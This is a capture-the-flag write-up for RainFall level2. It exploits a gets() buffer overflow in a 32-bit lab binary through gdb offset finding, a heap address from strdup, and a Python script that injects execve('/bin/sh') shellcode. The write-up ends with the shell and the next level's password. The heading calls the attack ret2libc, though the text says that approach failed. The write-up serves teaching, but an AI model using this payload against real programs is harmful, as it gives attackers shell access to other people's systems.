# Level 02

## Analysis

## Attack type: ret2libc

We started to play with binary, it seems to read on stdin and print on stdout the string we passed.

```bash
level2@RainFall:~$ ./level2
test
test
```

After few random test we notice that program segfault when the string passed exceed a certain value

```bash
level2@RainFall:~$ ./level2
testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
testtesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttesttest
Segmentation fault (core dumped)
```

We decompile binary with ghidra. We understand that we can do buffer overflow with variable named `local_50` and we also notice that there is weird condition based on value from `unaff_retaddr` but there is no line that setting value for this variable, interesting?

```c
void p(void)
{
  uint unaff_retaddr;
  char local_50 [76];

  fflush(stdout);
  gets(local_50);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
}

void main(void)
{
  p();
  return;
}
```

We open binary with gdb to understand the segfault. We watched many documentation/video and in some of them, they used pattern to found the return address (here a very good explanation: `https://www.youtube.com/watch?v=HSlhY4Uy8SA`).

We used https://wiremask.eu/tools/buffer-overflow-pattern-generator/ to generate pattern

```
level2@RainFall:~$ gdb level2
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level2/level2...(no debugging symbols found)...done.
(gdb) ^CQuit
(gdb) r
Starting program: /home/user/level2/level2
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

`0x37634136` correspond to offset 80, so it's mean from this offset we overflowed the eip value.

Also, interesting thing we found is a feature named ASLR (Address space layout randomization). ASLR is a computer security technique involved in protection from buffer overflow attacks. ASLR randomly arranges the address space positions of key data areas of a process, including the base of the executable and the positions of the stack, heap, and libraries.

We checked if this activate/desactive with stored in `/proc/sys/kernel/randomize_va_space`. 0 for disable, 2 for enable
```bash
level3@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
0
```
So it means we have determinist behavior on addresses returned by malloc. By using ltrace, we found address returned by strdup.
```bash
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                                            = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5test
)                                 = 0xbffff6fc
puts("test"test
)                                                                  = 5
strdup("test")                                                                = 0x0804a008
+++ exited (status 8) +++
```
We attempted a buffer overflow using ret2libc, but it failed because the string "/bin/sh" was not present in the binary. Therefore, we opted for a shellcode exploit. We found a suitable shellcode that contains the string "/bin/sh" and an execve syscall to spawn a shell. We used the space created by strdup to store our shellcode and the overflow to override the return pointer from the function `p`.

Many examples are available here: [Shell-Storm Shellcode Database](https://shell-storm.org/shellcode/files/shellcode-811.html) ([Shell-Storm Shellcode Index](https://shell-storm.org/shellcode/index.html)). We simply filtered by architecture.
```bash
level3@RainFall:~$ uname -a
Linux RainFall 3.2.0-90-generic-pae #128-Ubuntu SMP Fri Aug 14 22:16:51 UTC 2015 i686 athlon i386 GNU/Linux
```
We pick this one
```c
/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org
Disassembly of section .text:
08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80
*/

#include <stdio.h>
char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";
int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}
```

We made python script to inject it:
```python
import struct

returnAddress = struct.pack("I", 0x0804a008) # Return address from strdup
payload = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + (80-28)*'A' + returnAddress
print payload
```

Then inject the shellcode.

```bash
level2@RainFall:~$ (python /tmp/test.py; cat) | ./level2
1 Ph//shh/bin    °
                  ̀1 @̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
echo test
test
whoami
level3
cat ~/.pass
cat: ~/.pass: Permission denied
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```